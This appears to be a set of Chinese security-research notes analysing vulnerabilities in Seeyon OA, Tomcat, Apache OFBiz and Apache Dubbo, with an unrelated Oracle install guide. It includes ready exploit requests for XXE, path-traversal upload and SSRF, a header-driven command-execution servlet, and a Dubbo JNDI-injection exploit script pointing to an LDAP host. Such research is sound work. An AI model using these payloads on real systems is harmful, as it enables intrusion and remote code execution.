entry.title: 致远OA系列漏洞
entry.content:
金格控件XML外部实体注入漏洞

补丁分析

补丁替换iSolutions_web_API-V3.1.0.268.jar包的com.kg.core.AKgSignature类，通过diff发现漏洞代码存在getNodes方法内

getNodes方法为私有方法，在该类中xmlToList调用了方法

下一步需要找到谁调用了xmlToList方法

路由分析

由于金格为致远服务的第三方组件，其供了一整套API接口，先确定金格组件的servlet

com.kg.web.servlet.ActionServlet

查看该类在致远web.xml配置中的servlet名称为ActionServlet，匹配的路由模式为/m-signature/*

在ActionServlet中，doGet/doPost方法将请求交给process方法处理，process方法调用_process方法预处理

查看_process方法，从请求的uri中获取请求的action名和方法名

再通过反射调用请求action的方法

所以得知我们需要找到调用xmlToList方法中与Action相关的类，经测试RunSignatureAction类满足要求，下一步就是发送请求测试需要哪些参数让代码能够成功执行到xmlToList方法，经测试需要imgvalue和xmlValue参数

此时完整的http请求如下

POST /seeyon/m-signature/RunSignature/run HTTP/1.1Content-Length: 222Content-Type: application/x-www-form-urlencoded; charset=ISO-8859-1Host: 10.58.120.201User-Agent: Apache-HttpClient/4.5.14 (Java/1.8.0_65)Accept-Encoding: gzip, deflateConnection: closeimgvalue=ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=&xmlValue=%3C%21DOCTYPE+ANY+%5B%3C%21ENTITY+name+SYSTEM+%22http%3A%2F%2F127.0.0.1%3A9999%2Fsuccess_xxe%22+%3E%5D%3E%3Cname%3E%26name%3B%3C%2Fname%3E

经测试发送该请求响应404，大致是该接口需要鉴权

尝试加上用户权限的cookie后发送，成功200响应

是否可以未授权访问

查看web.xml文件，寻找一个可以未授权访问的接口，经测试发现/getAjaxDataServlet接口满足要求

构造请求发送，未触发漏洞

推测/getAjaxDataServlet需要提供请求参数，经调试可得?S=ajaxEdocSummaryManager&M=deleteUpdateObj参数

最终的poc如下

POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet?S=ajaxEdocSummaryManager&M=deleteUpdateObj HTTP/1.1Content-Length: 222Content-Type: application/x-www-form-urlencoded; charset=ISO-8859-1Host: 10.58.120.201User-Agent: Apache-HttpClient/4.5.14 (Java/1.8.0_65)Accept-Encoding: gzip, deflateConnection: closeimgvalue=ABCDEFGHIJKLMNOPQRSTUVWXYzabcdefghijklmnopqrstuvwxyZ0123456789+/=&xmlValue=%3C%21DOCTYPE+ANY+%5B%3C%21ENTITY+name+SYSTEM+%22http%3A%2F%2F127.0.0.1%3A9999%2Fsuccess_xxe%22+%3E%5D%3E%3Cname%3E%26name%3B%3C%2Fname%3E

致远OA WPS任意文件上传&读取漏洞

web路由是通配符，需要了解其如何调用servlet

一般通过服务的通用servlet去反射调用具体的action 或者 servlet

POST /seeyon/wpsAssistServlet?flag=save&fileId=1&realFileType=../../../../ApacheJetspeed/webapps/ROOT/success.txt HTTP/1.1Content-Length: 181Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAD5kvp4fACenrs2HHost: 10.58.120.201User-Agent: Apache-HttpClient/4.5.14 (Java/1.8.0_65)Accept-Encoding: gzip, deflateConnection: close------WebKitFormBoundaryAD5kvp4fACenrs2HContent-Disposition: form-data; name="payload"; filename="1.txt"Content-Type: text/plainpwn------WebKitFormBoundaryAD5kvp4fACenrs2H
GET /pwn.jsp HTTP/1.1Content-Length: 0Host: 10.58.120.201Connection: close

entry.title: Tomcat反序列化回显
entry.content:
基于全局变量的方式获取Request对象获取Response对象

概述

java-object-searcher

项目地址：https://github.com/c0ny1/java-object-searcher

该项目用于根据指定的关键字在内存中搜索指定的java对象

环境搭建

Tomcat测试版本：v8.5.50、JDK1.8.0_50

创建Web项目

导入依赖

<dependency>  <groupId>javax.servlet</groupId>  <artifactId>javax.servlet-api</artifactId>  <version>4.0.1</version></dependency>

创建Servlet

package com.pacemrc.javasec.rcecho;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.InvocationTargetException;public class EchoServlet extends HttpServlet {    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {        response.getWriter().print("ok");        try {            Object req = Util.getNeededRequestObject();            Object resp = req.getClass().getMethod("getResponse").invoke(req);            String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "X-Token");            if (header != null && !header.isEmpty()) {                String[] cmd = null;                String os = System.getProperty("os.name").toLowerCase();                if (os.contains("win")) {                    cmd = new String[]{"cmd.exe", "/c", header};                } else {                    cmd = new String[]{"/bin/sh", "-c", header};                }                String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();                // doWrite                resp.getClass().getMethod("setStatus", Integer.TYPE).invoke(resp, 200);                try {                    resp.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));                } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {                    Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");                    Object byteChunk = clazz.newInstance();                    clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);                    resp.getClass().getMethod("doWrite", clazz).invoke(resp, new Object[]{byteChunk});                }            }        } catch (Exception e) {}    }}

创建工具类

package com.pacemrc.javasec.rcecho;import me.gv7.tools.josearcher.entity.Blacklist;import me.gv7.tools.josearcher.entity.Keyword;import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;import java.lang.reflect.Field;import java.util.ArrayList;import java.util.List;public class Util {    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {        final Field field = getField(obj.getClass(), fieldName);        return field.get(obj);    }    public static Field getField(final Class<?> clazz, final String fieldName) {        Field field = null;        try {            field = clazz.getDeclaredField(fieldName);            field.setAccessible(true);        } catch (NoSuchFieldException ex) {            if (clazz.getSuperclass() != null)                field = getField(clazz.getSuperclass(), fieldName);        }        return field;    }    public static Object getNeededRequestObject() throws Exception {        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();        Field field = threadGroup.getClass().getDeclaredField("threads");        field.setAccessible(true);        Thread[] threads = (Thread[]) field.get(threadGroup);        boolean isEcho = false;        Object req = null;        for (int i = 0; i < threads.length; i++) {            if (isEcho) break;            // Thread 筛选            Thread thread = threads[i];            if (thread == null)                continue;            String threadName = thread.getName();            if (!(                    ((threadName.contains("http-nio") || threadName.contains("http-apr")) && threadName.contains("Poller"))                            || (threadName.contains("http-bio") && threadName.contains("AsyncTimeout"))                            || (threadName.contains("http-") && threadName.contains("Acceptor"))            ))                continue;            Object target = getFieldValue(thread, "target");            Object this0 = getFieldValue(target, "this$0");            Object handler = getFieldValue(this0, "handler");            Object global = getFieldValue(handler, "global");            java.util.List processors = (java.util.List) getFieldValue(global, "processors");            for (int j = 0; j < processors.size(); j++) {                if (isEcho) break;                Object processor = processors.get(j);                req = getFieldValue(processor, "req");            }        }        return req;    }    public static void SearchAllRequestObject() {        //设置搜索类型包含Request关键字的对象        List<Keyword> keys = new ArrayList<>();        keys.add(new Keyword.Builder().setField_type("Request").build());        //定义黑名单        List<Blacklist> blacklists = new ArrayList<>();        blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());        //新建一个广度优先搜索Thread.currentThread()的搜索器        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);        // 设置黑名单        searcher.setBlacklists(blacklists);        //打开调试模式,会生成log日志        searcher.setIs_debug(true);        //挖掘深度为20        searcher.setMax_search_depth(20);        //设置报告保存位置        searcher.setReport_save_path("D:\\tmp\\result");        searcher.searchObject();    }}

配置web.xml

<servlet>  <servlet-name>echo</servlet-name>  <servlet-class>com.pacemrc.javasec.rcecho.EchoServlet</servlet-class></servlet><servlet-mapping>  <servlet-name>echo</servlet-name>  <url-pattern>/echo</url-pattern></servlet-mapping>

配置Tomcat

分析

在doGet方法内下断点，debug运行Tomcat

访问http://localhost:8080/TomcatEcho/echoc触发断点

获取所有Request对象

在断点代码处执行Evaluate Expression，执行以Util.SearchAllRequestObject方法在内存中寻找所有类名中包含Request关键字的对象

Util.SearchAllRequestObject();

执行完成后会在指定的目录下创建查询结果文件

SearchRequstByBFS_result_*.txt文件记录了所有满足查找条件对象，搜索关键字global关键字，发现有3个对象

获取指定Request对象

根据对象的路径筛选出发起请求的Request对象，在断点代码处执行代码获取当前线程

Thread.currentThread()

根据SearchRequstByBFS_result_*.txt文件中对象存储的路径判断查找需要的Request对象，以第一个为例

TargetObject = {org.apache.tomcat.util.threads.TaskThread}    ---> group = {java.lang.ThreadGroup}     ---> threads = {class [Ljava.lang.Thread;}      ---> [15] = {java.lang.Thread}        ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}         ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}            ---> handler = {org.apache.coyote.AbstractProtocol$ConnectionHandler}             ---> global = {org.apache.coyote.RequestGroupInfo}

继续往下查找，发现processors数组列表字段中存储了需要的Request对象

在断点处执行表达式，获取需要的Request对象，实现方法为不断递归反射指定对象

Util.getNeededRequestObject();

获取Response对象

获取需要的Request对象后，即可获取对应的Response对象。要实现服务端可接收我们传入的命令，可通过添加自定义头来实现，服务端接收到自定义头的值后作为命令执行的参数，最后将命令执行的结果写入Response对象的响应体中。

代码细节

Object req = Util.getNeededRequestObject();Object resp = req.getClass().getMethod("getResponse").invoke(req);String header = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, "X-Token");if (header != null && !header.isEmpty()) {String[] cmd = null;String os = System.getProperty("os.name").toLowerCase();if (os.contains("win")) {cmd = new String[]{"cmd.exe", "/c", header};} else {cmd = new String[]{"/bin/sh", "-c", header};}String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();// doWriteresp.getClass().getMethod("setStatus", Integer.TYPE).invoke(resp, 200);try {resp.getClass().getDeclaredMethod("doWrite", java.nio.ByteBuffer.class).invoke(resp, java.nio.ByteBuffer.wrap(result.getBytes()));} catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {Class clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");Object byteChunk = clazz.newInstance();clazz.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(byteChunk, result.getBytes(), 0, result.getBytes().length);resp.getClass().getMethod("doWrite", clazz).invoke(resp, new Object[]{byteChunk});}}

entry.title: Apache-OFbiz系列漏洞
entry.content:
CVE-2020-9496

Apache OFBiz < 17.12.04

XML-RPC

XMLRPC是一个规范和一套实现方法，允许运行在不同操作系统和不同环境中的软件通过互联网进行过程调用。它使用 HTTP 作为传输方式，XML 作为编码方式进行远程过程调用。

http://xmlrpc.com/

Apache XML-RPC

Apache XML-RPC是XML-RPC的java实现方式，也是通过http协议传输xml格式数据来进行远程过程调用。

测试代码

服务端

pom.xml

<dependency>  <groupId>org.apache.xmlrpc</groupId>  <artifactId>xmlrpc-server</artifactId>  <version>3.1.3</version></dependency>

Calculator.java

package com.pacemrc.xmlrpc;public class Calculator {    public int add(int i1, int i2) {        return i1 + i2;    }    public int subtract(int i1, int i2) {        return i1 - i2;    }}

Server.java

package com.pacemrc.xmlrpc;import org.apache.xmlrpc.server.PropertyHandlerMapping;import org.apache.xmlrpc.server.XmlRpcServer;import org.apache.xmlrpc.server.XmlRpcServerConfigImpl;import org.apache.xmlrpc.webserver.WebServer;public class Server {    private static final int port = 8080;    public static void main(String[] args) throws Exception {        WebServer webServer = new WebServer(port);        XmlRpcServer xmlRpcServer = webServer.getXmlRpcServer();        PropertyHandlerMapping phm = new PropertyHandlerMapping();        phm.load(Thread.currentThread().getContextClassLoader(), "XmlRpcServlet.properties");        //这也是一种指定方案        //phm.addHandler("Calculator", service.Calculator.class);        xmlRpcServer.setHandlerMapping(phm);        XmlRpcServerConfigImpl serverConfig = (XmlRpcServerConfigImpl) xmlRpcServer.getConfig();        serverConfig.setEnabledForExtensions(true);        serverConfig.setContentLengthOptional(false);        webServer.start();    }}

XmlRpcServlet.properties

在resources目录下创建文件

Calculator=com.pacemrc.xmlrpc.Calculator

运行Server

客户端

pom.xml

<dependency>  <groupId>org.apache.xmlrpc</groupId>  <artifactId>xmlrpc-client</artifactId>  <version>3.1.3</version></dependency>

Client.java

import org.apache.xmlrpc.XmlRpcException;import org.apache.xmlrpc.client.XmlRpcClient;import org.apache.xmlrpc.client.XmlRpcClientConfigImpl;import java.net.MalformedURLException;import java.net.URL;public class Client {    public static void main(String[] args) throws XmlRpcException, MalformedURLException {        XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl();        config.setServerURL(new URL("http://10.58.120.200:8080/xmlrpc"));        XmlRpcClient client = new XmlRpcClient();        client.setConfig(config);        Object[] params = new Object[]{new Integer(33), new Integer(9)};        Integer result = (Integer) client.execute("Calculator.add", params);        System.out.println(result);    }}

运行客户端，成功调用服务端的类的方法

通信流量

POST /xmlrpc HTTP/1.1Content-Type: text/xmlUser-Agent: Apache XML RPC 3.1.3 (Sun HTTP Transport)Cache-Control: no-cachePragma: no-cacheHost: 127.0.0.1:8080Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveContent-Length: 200<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>Calculator.add</methodName><params><param><value><i4>33</i4></value></param><param><value><i4>9</i4></value></param></params></methodCall>
newInstance:396, Class (java.lang)getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeMethod:2170, PropertyUtilsBean (org.apache.commons.beanutils)getSimpleProperty:1332, PropertyUtilsBean (org.apache.commons.beanutils)getNestedProperty:770, PropertyUtilsBean (org.apache.commons.beanutils)getProperty:846, PropertyUtilsBean (org.apache.commons.beanutils)getProperty:426, PropertyUtils (org.apache.commons.beanutils)compare:163, BeanComparator (org.apache.commons.beanutils)siftDownUsingComparator:721, PriorityQueue (java.util)siftDown:687, PriorityQueue (java.util)heapify:736, PriorityQueue (java.util)readObject:795, PriorityQueue (java.util)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeReadObject:1058, ObjectStreamClass (java.io)readSerialData:1900, ObjectInputStream (java.io)readOrdinaryObject:1801, ObjectInputStream (java.io)readObject0:1351, ObjectInputStream (java.io)readObject:371, ObjectInputStream (java.io)getResult:36, SerializableParser (org.apache.xmlrpc.parser)endValueTag:78, RecursiveTypeParserImpl (org.apache.xmlrpc.parser)endElement:185, MapParser (org.apache.xmlrpc.parser)endElement:103, RecursiveTypeParserImpl (org.apache.xmlrpc.parser)endElement:165, XmlRpcRequestParser (org.apache.xmlrpc.parser)endElement:-1, AbstractSAXParser (org.apache.xerces.parsers)scanEndElement:-1, XMLNSDocumentScannerImpl (org.apache.xerces.impl)dispatch:-1, XMLDocumentFragmentScannerImpl$FragmentContentDispatcher (org.apache.xerces.impl)scanDocument:-1, XMLDocumentFragmentScannerImpl (org.apache.xerces.impl)parse:-1, XML11Configuration (org.apache.xerces.parsers)parse:-1, XML11Configuration (org.apache.xerces.parsers)parse:-1, XMLParser (org.apache.xerces.parsers)parse:-1, AbstractSAXParser (org.apache.xerces.parsers)parse:-1, SAXParserImpl$JAXPSAXParser (org.apache.xerces.jaxp)getRequest:285, XmlRpcEventHandler (org.apache.ofbiz.webapp.event)execute:229, XmlRpcEventHandler (org.apache.ofbiz.webapp.event)invoke:145, XmlRpcEventHandler (org.apache.ofbiz.webapp.event)runEvent:741, RequestHandler (org.apache.ofbiz.webapp.control)doRequest:465, RequestHandler (org.apache.ofbiz.webapp.control)doGet:217, ControlServlet (org.apache.ofbiz.webapp.control)doPost:91, ControlServlet (org.apache.ofbiz.webapp.control)

Apache OFbiz的XML-RPC

在Apache OFbiz中用于处理XML-RPC请求的类是org.apache.ofbiz.webapp.event.XmlRpcEventHandler

在其org.apache.ofbiz.webapp.event.XmlRpcEventHandler#getRequest中解析用户传入的XML数据

XML-RPC同样可处理序列化数据，其处理序列化数据的类是org.apache.xmlrpc.parser.SerializableParser，漏洞点在其org.apache.xmlrpc.parser.SerializableParser#getResult方法，其直接将字节数据反序列化为对象。

接下来的思路是找到xml-rpc的接口并构造序列化的数据即可进行反序列化

寻找XML-RPC接口的路由

Apache OFbiz的中间件是tomcat，其配置文件路径大概为webapps/WEB-INF/web.xml，找到该配置文件

其中只配置了一个ControlServlet，对应的类是org.apache.ofbiz.webapp.control.ControlServlet

使用以下数据包尝试发送请求

POST /webtools/control/xmlrpc HTTP/1.1Content-Type: text/xmlUser-Agent: Apache XML RPC 3.1.3 (Sun HTTP Transport)Cache-Control: no-cachePragma: no-cacheHost: 127.0.0.1:8080Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: keep-aliveContent-Length: 200<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>Calculator.add</methodName><params><param><value><i4>33</i4></value></param><param><value><i4>9</i4></value></param></params></methodCall>

服务端报错

org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [examples.getStateName]

在org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException异常类内下断点

发送请求

参考

https://xz.aliyun.com/t/8324

https://ws.apache.org/xmlrpc/index.html

https://www.jianshu.com/p/14cfefdfc0e7

CVE-2023-49070

Apache OFBiz <18.12.09

CVE-2023-50968

Apache OFBiz <18.12.11

https://lists.apache.org/thread/x5now4bk3llwf3k58kl96qvtjyxwp43q

https://issues.apache.org/jira/browse/OFBIZ-12875

POC

POST /partymgr/control/getJSONuiLabelArray HTTP/1.1Host: 10.58.120.200:8080Content-Length: 47Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closerequiredLabels={"http://127.0.0.1:8000/":["a"]}
POST /partymgr/control/getJSONuiLabel HTTP/1.1Host: ipContent-Length: 44Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Language: zh-CN,zh;q=0.9Accept-Encoding: gzip, deflateConnection: closerequiredLabel={"http://127.0.0.1:8000/":"a"}

调用栈

entry.title: Oracle 11g安装
entry.content:
Oracle11g安装

软件下载

Oracle 11g win 64位操作系统 下载地址：

https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_1of2.zip

https://download.oracle.com/otn/nt/oracle11g/112010/win64_11gR2_database_2of2.zip

安装Oracle

安装 .Net Framework 3.5

安装Oracle

解压压缩安装包，进入database文件夹，双击setup.exe运行安装程序

配置安全更新

去掉勾选接收安全更新，点击下一步

安装选项

选择“配置和安装数据库”，点击下一步

系统类

选择“服务器类“，点击下一步

网格安装选择

选择”单实例数据库安装“，点击下一步

安装类型

选择”高级安装“，点击下一步

产品语言

默认即可，点击下一步

数据库版本

选择”企业版“，点击下一步

安装位置

指定oracle的安装目录，此处我自定义了oracle11g目录，点击下一步

配置类型

选择”一般用途/事务类型“，点击下一步

数据库标识符

默认即可，点击下一步

配置选项

需要更改的项为【字符集】，选择”使用Unicode“，点击下一步

管理选项

默认即可，点击下一步

数据库存储

默认即可，点击下一步

备份和恢复

自行选择是否需要备份，此处默认即可，点击下一步

方案口令

可选择所有账户使用相同的口令，123.com，点击下一步

概要

建议保存响应文件，方便后续查看，最后点击完成

安装产品

oracle开始安装

配置

打开cmd命令行

sqlplus / as sysdba

创建表

#创建临时表空间CREATE TEMPORARY TABLESPACE firsttmpspacea TEMPFILE 'C:\oracle11g\firsttmpspacea.dbf' SIZE 50M;#创建表空间CREATE TABLESPACE firstspace DATAFILE 'C:\oracle11g\firstspace.dbf' SIZE 100M;#创建数据库#创建用户CREATE USER user01 IDENTIFIED BY user01 DEFAULT TABLESPACE firstspace TEMPORARY TABLESPACE firsttmpspacea;#授权数据库连接grant dba,connect to user01;

基础使用

#查看数据库名称SELECT name FROM v$database;**#**查看所有表****SELECT table_name FROM all_tables;#查看所有数据库SELECT instance_name, status FROM v$instance;

entry.title: Apache Dubbo系列漏洞
entry.content:
CVE-2020-1948

漏洞通告

https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html

利用方式一

利用provider查找不存在的服务抛出异常时隐式调用toString方法作为入口点

python代码

from dubbo.codec.hessian2 import Decoder,new_objectfrom dubbo.client import DubboClientif __name__ == '__main__':    client = DubboClient('10.58.120.200', 20880)    JdbcRowSetImpl = new_object(        'com.sun.rowset.JdbcRowSetImpl',        dataSource="ldap://10.58.120.200:1389/vg1wxo",        strMatchColumns=["foo"]    )    JdbcRowSetImplClass = new_object(        'java.lang.Class',        name="com.sun.rowset.JdbcRowSetImpl",    )    toStringBean = new_object(        'com.rometools.rome.feed.impl.ToStringBean',        beanClass=JdbcRowSetImplClass,        obj=JdbcRowSetImpl    )    resp = client.send_request_and_return_response(        service_name='any_name',        method_name='any_method',        args=[toStringBean])    print(resp)

漏洞分析

漏洞点在org.apache.dubbo.rpc.RpcInvocation#toString方法中的Arrays.toString(this.arguments)，其中的this.arguments是可控的

public String toString() {    return "RpcInvocation [methodName=" + this.methodName + ", parameterTypes=" + Arrays.toString(this.parameterTypes) + ", arguments=" + Arrays.toString(this.arguments) + ", attachments=" + this.attachments + "]";}

在org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker方法中下断点，首先在inv对象的attachments中获取path值，此处path字段是provider中一个不存在的服务名

再根据获取到的port，path等信息获取serviceKey字符串，再从exporterMap中根据serviceKey值获取exporter，如果exporter为空则抛出异常

在new RemotingException()的构造函数中进行了字符串与对象的拼接，其中包含inv对象。

当对象与字符串拼接时会隐式调用StringBuilder.append(obj)–>String.valueOf(obj)–>obj.toString方法

throw new RemotingException(channel, "Not found exported service: " + serviceKey + " in " + this.exporterMap.keySet() + ", may be version or group mismatch , channel: consumer: " + channel.getRemoteAddress() + " --> provider: " + channel.getLocalAddress() + ", message:" + inv);

多次强制步入到inv对象的append方法

进入valueOf方法

进入toString方法，来到org.apache.dubbo.rpc.RpcInvocation#toString方法，在Arrays.toString(this.arguments)中，参数是我们传入的对象数组

进入Arrays.toString()方法，内部循环遍历对象数组调用String.valueOf()方法，a[i]为ToStringBean对象

继续进入String.valueOf(a[i])方法，即将调用ToStringBean对象的toString方法

ToStringBean.toString方法中会遍历其所有getter方法，会调用到getDatabaseMetaData方法，最后实现jndi注入

调用链

lookup:417, InitialContext (javax.naming)connect:624, JdbcRowSetImpl (com.sun.rowset)getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)invoke:-1, GeneratedMethodAccessor11 (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)toString:158, ToStringBean (com.rometools.rome.feed.impl)toString:129, ToStringBean (com.rometools.rome.feed.impl)valueOf:2994, String (java.lang)toString:4571, Arrays (java.util)toString:429, RpcInvocation (org.apache.dubbo.rpc)valueOf:2994, String (java.lang)append:131, StringBuilder (java.lang)getInvoker:265, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)reply:120, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)handleRequest:100, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)received:175, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)received:51, DecodeHandler (org.apache.dubbo.remoting.transport)run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:745, Thread (java.lang)

漏洞修复

https://github.com/apache/dubbo/compare/dubbo-2.7.4...dubbo-2.7.5#diff-2568ebdce1edca56f363ca597550d02cd4cd8b454ab78eb858acfded7362e821

官方增加了getInvocationWithoutData方法对inv对象处理

在getInvocationWithoutData方法中将inv对象的arguments置空

利用方式二

利用org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)方法对传入的服务名、方法名、方法描述校验缺陷，攻击者可以构造恶意对象，利用dubbo的反序列化器实现反序列化

漏洞分析

在decode方法处下断点，首先根据this.serializationType获取序列化器

进入getSerialization方法，通过getSerializationById()方法根据id获取Serialization对象

进入getSerializationById()方法，从ID_SERIALIZATION_MAP中获取对象，id为2获取的对象是Hessian2Serialization

获取到Serialization对象后，调用deserialize方法反序列化，即创建一个Hessian2ObjectInput对象

再从Hessian2ObjectInput对象中依次读取dubbo版本，服务名path，方法名，方法描述符等值

接下来分别创建了对象数组args和类数组pts，再根据服务名path在注册的服务中查找服务

当serviceDescriptor为空，则根据方法描述符创建类数组对象赋值给pts，再创建以新的对象数组赋值给args，长度为pts类数组的长度，然后循环遍历args对象数组进行readObject反序列化对象

进入in.readObject方法

进入到com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class<?>…)方法，根据tag值进入分支处理

此处tag值为72，首先根据exprctedClass获取获取Deserializer反序列化器

进入getDeserializer方法，首先在_staticDeserializerMap中获取，再在_cachedDeserializerMap中获取对应的反序列化器

获取到对应的反序列化器后，带调用readMap方法读取Map对象

来到MapDeserializer.readMap()方法，首先创建一个map对象，在调用doReadMap方法

在doReadMap方法中，循环从Hessian2Input输入流中读取键值对对象并HashMap.put()到map对象中

反序列化完键值对后进入put方法，key和value都是EqualsBean对象

由此便进入到ROME调用链，进入到ToStringBean.toString方法中，获取所有getter方法，最终通过getDatabaseMetaData()方法实现JNDI注入

调用链

lookup:417, InitialContext (javax.naming)connect:624, JdbcRowSetImpl (com.sun.rowset)getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)toString:158, ToStringBean (com.rometools.rome.feed.impl)toString:129, ToStringBean (com.rometools.rome.feed.impl)beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)hashCode:180, EqualsBean (com.rometools.rome.feed.impl)hash:338, HashMap (java.util)put:611, HashMap (java.util)doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)readObject:2093, Hessian2Input (com.alibaba.com.caucho.hessian.io)readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)received:44, DecodeHandler (org.apache.dubbo.remoting.transport)run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:745, Thread (java.lang)

漏洞修复

https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0

官方在org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)方法中对方法名进行了校验，如果客户端传入的方法名不是$INVOKE、$INVOKE_ASYNC或$ECHO则抛出异常

参考

https://xz.aliyun.com/t/7969

http://rui0.cn/archives/1338

CVE-2020-11995

漏洞通告

https://lists.apache.org/thread/jnmy3z0obmq6j0nlnqmv79yv35jjh01x

该漏洞是CVE-2020-11995补丁的绕过，当客户端传入的方法名是$INVOKE、$INVOKE_ASYNC或$ECHO时，依然会根据方法的描述类型获取对应的反序列化器，再构造对应的恶意对象触发反序列化链

漏洞分析

分析过程同CVE-2020-1948，这里仅分析差异

进入到pts类数组判断，增加了对方法名称的判断

当传入的方法名是$INVOKE、$INVOKE_ASYNC或$ECHO时即可绕过该校验

调用链

同CVE-2020-1948

漏洞修复

对客户端传入的方法描述符进行了校验，当方法描述符不是Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;或Ljava/lang/Object;时抛出异常

CVE-2021-25641

漏洞通告

https://lists.apache.org/thread/g129y1xjtcxswjj506pvzmlbzfvtmsqw

Dubbo的consumer端可指定provider端使用的序列化协议，默认使用的是Hessian2Serialization反序列化器，该漏洞是利用KyroSerialization或FstSerialization反序列化器中的缺陷实现反序列化

漏洞分析

Kryo反序列化

在DecodeableRpcInvocation#decode方法内下断点，首先根据this.serializationType获取序列化器

进入getSerialization方法，由getSerializationById(id)方法根据id获取Serialization对象，继续进入getSerializationById()

id为8，获取的是KryoSerialization

获取到Serialization对象后，调用deserialize方法反序列化对象，即创建一个KryObjectInput对象

随后再获取传入的版本，服务名，方法名，方法描述符，再根据方法描述符是否为空选择创建pts类数组对象和args对象数组

再从输入流中根据类数组的类型恢复参数

进入in.readObject

